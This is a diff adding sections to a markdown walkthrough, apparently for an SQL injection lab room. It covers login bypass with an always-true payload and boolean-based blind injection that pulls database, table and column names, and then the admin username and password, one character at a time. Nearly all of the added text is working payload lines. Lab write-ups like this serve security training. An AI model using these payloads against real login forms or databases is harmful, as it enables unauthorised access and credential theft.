@@ -47,6 +47,56 @@ Deploy the machine, then use the given commands by inserting it next to the last
 ```
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
-By doing the steps above you will be able to find the username and password, then you can proceed inputting it in the login form.
+By doing the steps above you will be able to find the username and password, then you can proceed inputting it in the login form and you will get the flag in the next page.
 
+#### `Task 6: Blind SQLi - Authentication Bypass`
+The next one is basically bypassing the authentication with the help of simple SQL injection,
+In the login form you can basically input any username you want but in the password section I used- 
+```
+' OR 1=1;--
+```
+This means that the server will receive the payload as an true statement and will proceed to login the account.
+
+#### `Task 7: Blind SQLi - Boolean Based`
+This task will have an indicator when the characters that are being type are equal to the actual name of the database,table or column.
+When the application will return true that means that you are typing the correct character or number. 
+
+Firstly, we will use this code and it will return true since there are three columns in that table.
+```
+admin123' UNION SELECT 1,2,3;-- 
+```
+Then, we will guess for the correct database name for us to exploit the database.
+```
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
+admin123' UNION SELECT 1,2,3 where database() like 'sql%';--
+```
+By doing this cycle as much as possible the indicator will return true, so that we will know if we are getting the exact name for the database.
+Then after we get the actual name of the database we will now search for the table name.
+```
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'us%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'use%';--
+```
+After that we will now proceed getting the column name.
+```
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'id%';--
+```
+But we did find the other column name that is `id` and it is just basically nonsense for us so we will ignore it and continue finding other column name.
+```
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'userna%' and COLUMN_NAME !='id';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'passwo%' and COLUMN_NAME !='id';--
+```
+After we find the two column name that seems valuable to us which is `username` and `password` then we will now proceed to find the row or data in that column.
+```
+admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
+admin123' UNION SELECT 1,2,3 from users where username like 'ad%';--
+admin123' UNION SELECT 1,2,3 from users where username like 'adm%';--
+```
+Then for the password-
+```
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '38%';--
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '384%';--
+```
 
